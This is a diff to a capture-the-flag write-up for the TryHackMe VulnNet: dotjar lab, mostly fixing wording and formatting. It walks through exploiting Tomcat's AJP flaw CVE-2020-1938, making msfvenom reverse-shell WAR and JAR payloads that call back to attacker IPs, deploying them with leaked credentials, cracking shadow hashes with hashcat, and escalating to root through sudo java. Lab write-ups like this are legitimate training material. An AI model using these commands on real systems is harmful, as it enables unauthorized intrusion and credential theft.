@@ -28,10 +28,10 @@ PORT     STATE SERVICE REASON  VERSION
 ## Foothold
 
 - On port 8080, Apache Tomcat/9.0.30
-- On port 8009, ajp13 --> quick search --> CVE-2020-1938 --> can exploit with metasploit  
+- On port 8009, ajp13 --> quick search --> CVE-2020-1938 --> can exploit with Metasploit  
 ![](/commons/THM/Vulnnet-dotjar/0_msf.png)
 
-With default param in metasploit, we can see a creds for `host-manager`
+With the default param in Metasploit, we can see creds for `host-manager`
 
 ```
 1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
@@ -50,19 +50,21 @@ GUI access is disabled for security reasons.
 
 ```
 
-In `Tomcat Virtual Host Manager` we can use exploit from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
+In `Tomcat Virtual Host Manager` we can use an exploit from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 
-1. Make a malicious .war file 
+1. Make a malicious .war file
   `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=9001 -f war -o shell.war`
 
 2. Upload and deploy on vuln server
-  `curl --upload-file shell.war -u 'webdev:Hgj3LA$02D$Fa@21' "http://10.10.208.139:8080/manager/text/deploy?path=/shell"'
+   ```curl --upload-file shell.war -u 'webdev:Hgj3LA$02D$Fa@21' "<http://10.10.208.139:8080/manager/text/deploy?path=/shell>"```
 
-3. Get revershell 
-  - Open listen `Terminal' on port 9001 
+3. Get revershell
+
+- Open listen `Terminal' on port 9001
     `nc -nlvp 9001'  
   
-  - Extract .jsp file from .war 
+- Extract .jsp file from .war
+
     ```
     unzip shell.war
     Archive:  shell.war
@@ -70,13 +72,15 @@ In `Tomcat Virtual Host Manager` we can use exploit from [hacktricks](https://bo
     inflating: WEB-INF/web.xml
     inflating: opilidtxwqm.jsp
     ```
-  - Access vuln file
+
+- Access vuln file
     `curl -u 'webdev:Hgj3LA$02D$Fa@21' "http://10.10.208.139:8080/shell/opilidtxwqm.jsp"`
 
 ## Privilege Escalation
 
 - After enumeration, we can find a `shadow-backup-alt.gz` in `/var/backups`
 - unzip `.gz` file with `gzip -d shadow-backup-alt.gz`, we can see 3 passwd hash of `root/jdk-admin/web`
+
 ```shell
 cat shadow-backup-alt
 root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
@@ -116,6 +120,7 @@ web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG
 - Try crack hash with `hashcat` mode 1800, we got passwd of jdk-admin
 ***Got user flag***
 - With jdk-admin password, run basic command to check vector priv linux
+
   ```
   sudo -l
   Matching Defaults entries for jdk-admin on vulnnet-dotjar:
@@ -126,7 +131,7 @@ web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG
   ```
 
 - jdk-admin can run a `.jar` file as root user without passwd of root group
-- Make a malicious `.jar` 
+- Make a malicious `.jar`
   `msfvenom -p java/shell_reverse_tcp LHOST=10.8.51.36 LPORT=4444 -f jar -o rev.jar`
 - Upload to victim via local server with python
   - On local
